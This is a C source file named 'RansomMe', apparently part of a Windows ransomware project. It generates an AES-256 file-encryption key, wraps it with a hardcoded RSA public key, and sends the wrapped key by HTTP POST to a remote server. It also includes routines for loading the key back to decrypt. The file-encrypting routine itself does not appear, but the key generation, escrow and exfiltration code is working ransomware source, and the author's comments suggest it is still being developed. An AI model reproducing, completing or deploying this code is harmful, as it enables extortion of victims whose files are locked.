#include "RansomMe.h"

// static functions
static BOOL LoadPublicKey(HCRYPTPROV* hProv, HCRYPTKEY* hKey);
static BOOL SendKeyOverHTTP(const char* serverName, const char* postData);
static BOOL ExportToPEM(HCRYPTKEY hKey, HCRYPTKEY hPubKey, char* keyEncoded);
static BOOL LoadKeyFromFile(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey, const char* keyFileName);

// Initialize the crypto environment, hCryptProv will point to the crypt provider and hKey to the key handler
BOOL InitCrypto(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey) {
    // Acquire a cryptographic provider context to use AES symmetric encryption
    if (!CryptAcquireContext(hCryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error: CryptAcquireContext failed. Error Code: %lu\n", GetLastError());
        return FALSE;
    }

    // Generate a key for the provider using the CALG_AES_256
    if (!CryptGenKey(*hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, hKey))
    {
        printf("Error: CryptGenKey failed. Error Code: %lu\n", GetLastError());

        // Release the crypto provider handle.
        if (hCryptProv) {
            if (!(CryptReleaseContext(hCryptProv, 0))) {
                printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
            }
        }
        return FALSE;
    }

    return TRUE;
}

// Initialize the crypto environment, hCryptProv will point to the crypt provider and hKey to the key handler
// I would like to call this InitCrypto as well, but I don't know how to overload a function in c
BOOL InitDeCrypto(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey, const char* keyFile) {
    // Acquire a cryptographic provider context to use AES symmetric encryption
    if (!CryptAcquireContext(hCryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error: CryptAcquireContext failed. Error Code: %lu\n", GetLastError());
        return FALSE;
    }
    // load the key from a file
    if (!LoadKeyFromFile(hCryptProv, hKey, keyFile)) {
        printf("Error loading the key from %s. Error Code: %lu\n", keyFile, GetLastError());
        return FALSE;
    }

    printf("Key successfully loaded from %s\n", keyFile);
    return TRUE;
}

// The public key is hardcoded in PEM format, this function decodes it and import it
BOOL LoadPublicKey(HCRYPTPROV* hProv, HCRYPTKEY* hKey) {
    // Public key in PEM format
    static const char* b64_pubKey = "BgIAAACkAABSU0ExAAgAAAEAAQCxwjeWWlr4rXPoNPpQ+GbS2dT8HNM1qpGKo6FOsmLfEf0Lzb8oQdaqgII+ZG+ZjGQAK8pe0M4"
        "wb/dSlS1ZRphehyw/JnE3IkJO197OZMzYzi98WnZgSZEGs7jAY0mPhnrFytOatuL4BcxmtGd6MCZMscaMYwbwkNSOeDhbGx0z5p"
        "LeIAi0Z3zGD9KntVa4pL8FG4f/4KH7I7GPZKpAI3mfzZF08C3DupbO4xTS3witFVXFFclnx7kJDdrLoKBJBj+rVgrtr55kSrcsF"
        "pntYWjG9GAyelhSrkQhJozdsOSJ7dNpDo8KBcSkT25qz8P06Vy4pwWQWu/ID64Y6EgnetvE";

    // Decode Base64
    BYTE* decodedData = NULL;
    DWORD decodedDataLen = 0;

    // Get required size for the key blob
    if (!CryptStringToBinaryA(b64_pubKey, 0, CRYPT_STRING_BASE64, NULL, &decodedDataLen, NULL, NULL)) {
        printf("Failed to calculate decoded data length. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Allocate memory for the key blob
    decodedData = (BYTE*)malloc(decodedDataLen);
    if (!decodedData) {
        printf("Memory allocation failed for decoded data.\n");
        return FALSE;
    }

    // Get the key blob decoded
    if (!CryptStringToBinaryA(b64_pubKey, 0, CRYPT_STRING_BASE64, decodedData, &decodedDataLen, NULL, NULL)) {
        printf("Failed to decode Base64 data. Error: %lu\n", GetLastError());
        free(decodedData);
        return FALSE;
    }

    // Import public key
    if (!CryptImportKey(*hProv, decodedData, decodedDataLen, 0, CRYPT_OAEP, hKey)) {
        printf("Failed to import public key. Error: %lu\n", GetLastError());
        free(decodedData);
        //CryptReleaseContext(*hProv, 0);
        return FALSE;
    }

    free(decodedData);
    return TRUE;
}

BOOL ExportToPEM(HCRYPTKEY hKey, HCRYPTKEY hPubKey, char** keyEncoded) {
    DWORD keyBlobSize = 0;                  // to store the size of the key blob
    DWORD keyEncodedSize = 0;               // to store the size of the encoded key
    
    BYTE* keyBlob = NULL;                   // to store the exported keyBlob
    BOOL success = FALSE;                   // flag to return success or failure

    // Get the size of the encryption key blob
    if (!CryptExportKey(hKey, hPubKey, SIMPLEBLOB, 0, NULL, &keyBlobSize)) {
        printf("Error: CryptExportKey failed. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Allocate memory for the encryption key blob
    keyBlob = (BYTE*)malloc(keyBlobSize);
    if (!keyBlob) {
        printf("Error: Memory allocation failed.\n");
        goto cleanup;
    }

    // Export the encryption key into the blob
    if (!CryptExportKey(hKey, hPubKey, SIMPLEBLOB, 0, keyBlob, &keyBlobSize)) {
        printf("Error: CryptExportKey failed. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Get the size of the returned encoded key
    if (!CryptBinaryToStringA(keyBlob, keyBlobSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &keyEncodedSize)) {
        printf("Base64 length calculation failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Allocate memory for the encoded key
    *keyEncoded = (char*)malloc(keyEncodedSize);
    if (*keyEncoded == NULL) {
        printf("Memory allocation failed.\n");
        goto cleanup;
    }

    // Get the encoded key
    if (!CryptBinaryToStringA(keyBlob, keyBlobSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *keyEncoded, &keyEncodedSize)) {
        printf("Base64 encoding failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // set success to TRUE
    success = TRUE;

cleanup:
    // Release memory only if something went wrong
    if (keyBlob) { free(keyBlob); }
    if (success == FALSE) {
        if (*keyEncoded) { free(*keyEncoded); }
    }
    
    return success;
}

BOOL SendKeyOverHTTP(const char* serverName, const char* postData) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;       // The connection handlers
    const char* resource = "/index.html";                               // Hardcoded resource
    BOOL success = FALSE;                                               // Success flag

    // Initialize WinINet
    hInternet = InternetOpenA("WinINetPostExample", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Connect to the server
    hConnect = InternetConnectA(hInternet, serverName, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnect failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Open an HTTP request
    hRequest = HttpOpenRequestA(hConnect, "POST", resource, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        printf("HttpOpenRequest failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Set headers for the POST request
    const char* headers = "Content-Type: application/x-www-form-urlencoded";
    DWORD headersLength = (DWORD)strlen(headers);

    // Send the POST request
    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, headersLength, (LPVOID)postData, (DWORD)strlen(postData));
    if (!bRequestSent) {
        printf("HttpSendRequest failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }


    printf("POST request sent successfully.\n");
    success = TRUE;

cleanup:
    if (hRequest) { InternetCloseHandle(hRequest); }
    if (hConnect) { InternetCloseHandle(hConnect); }
    if (hInternet) { InternetCloseHandle(hInternet); }

    return success;
}

// This function saves the key into a file, I want to change this to encrypt and send to a web server
BOOL ExportKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey, const char* serverName) {
    BOOL success = FALSE;                   // success flag to return
    HCRYPTKEY hPubKey = 0;                  // the public key handler
    char** keyEncoded = NULL;                // to store the encoded key

    keyEncoded = (char*)malloc(sizeof(char*));
    if (!keyEncoded) {
        printf("Error: Cannot allocate memory for keyEncoded. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // First load the public key from the hardcoded constant
    if (!LoadPublicKey(&hCryptProv, &hPubKey)) {
        printf("Error: Cannot load public key. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Then export the encryption key to PEM
    if (!ExportToPEM(hKey, hPubKey, keyEncoded)) {
        printf("Error: Cannot export key to PEM. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Last send the key over HTTP
    if (!SendKeyOverHTTP(serverName, *keyEncoded)) {
        printf("Error: Cannot send the key over HTTP. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    success = TRUE;
    printf("Key successfully sent to %s\n", serverName);

cleanup:
    // Clean up
    if (hPubKey) { CryptDestroyKey(hPubKey); }
    if (*keyEncoded) { free(*keyEncoded); }
    if (keyEncoded) { free(keyEncoded); }

    return success;
}

// This function imports a key from a file, the imported key should be a plain (no encryption) binary file (DER)
BOOL LoadKeyFromFile(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey, const char* keyFileName) {
    DWORD fileSize = 0;                     // the key size
    DWORD bytesRead = 0;                    // number of bytes read from the key file
    BYTE* keyBlob = NULL;                   // pointer to the key bytes
    HANDLE hFile = INVALID_HANDLE_VALUE;    // key file handler
    BOOL success = FALSE;                   // success flag

// Used for testing only, it returns a private key hardcoded in the LoadPrivateKey function below
//    HCRYPTKEY hPrivKey = 0;
//    LoadPrivateKey(&hCryptProv, &hPrivKey);

    // open the key file
    hFile = CreateFileA(keyFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error: Unable to open key file %s. Error Code: %lu\n", keyFileName, GetLastError());
        goto cleanup;
    }

    // Get the size of the key blob
    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("Error: Failed to get file size. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Read the key blob into memory
    keyBlob = (BYTE*)malloc(fileSize);
    if (!keyBlob) {
        printf("Error: Memory allocation failed.\n");
        goto cleanup;
    }

    // read the key file and store the byste in keyBlob
    if (!ReadFile(hFile, keyBlob, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("Error: Failed to read key file. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Import the key into the cryptographic provider
    if (!CryptImportKey(*hCryptProv, keyBlob, fileSize, 0, 0, hKey)) {
        printf("Error: CryptImportKey failed. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    success = TRUE;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) { CloseHandle(hFile); }
    if (keyBlob) { free(keyBlob); }

//    if (hPrivKey) { CryptDestroyKey(hPrivKey); }

    return success;
}

// I used this for testing only, it imports a private key from a hardcoded string in PEM format
/*
BOOL LoadPrivateKey(HCRYPTPROV* hProv, HCRYPTKEY* hKey) {
    // private key in PEM format
    static const char* b64_privKey = "PUT YOUR PEM PRIVATE KEY HERE";

    // Decode Base64
    BYTE* decodedData = NULL;
    DWORD decodedDataLen = 0;

    // Get required size for the key blob
    if (!CryptStringToBinaryA(b64_privKey, 0, CRYPT_STRING_BASE64, NULL, &decodedDataLen, NULL, NULL)) {
        printf("Failed to calculate decoded data length. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Allocate memory for the key blob
    decodedData = (BYTE*)malloc(decodedDataLen);
    if (!decodedData) {
        printf("Memory allocation failed for decoded data.\n");
        return FALSE;
    }

    // Get the key blob decoded
    if (!CryptStringToBinaryA(b64_privKey, 0, CRYPT_STRING_BASE64, decodedData, &decodedDataLen, NULL, NULL)) {
        printf("Failed to decode Base64 data. Error: %lu\n", GetLastError());
        free(decodedData);
        return FALSE;
    }

    // Import public key
    if (!CryptImportKey(*hProv, decodedData, decodedDataLen, 0, 0, hKey)) {
        printf("Failed to import public key. Error: %lu\n", GetLastError());
        free(decodedData);
        //CryptReleaseContext(*hProv, 0);
        return FALSE;
    }

    free(decodedData);
    return TRUE;
}
*/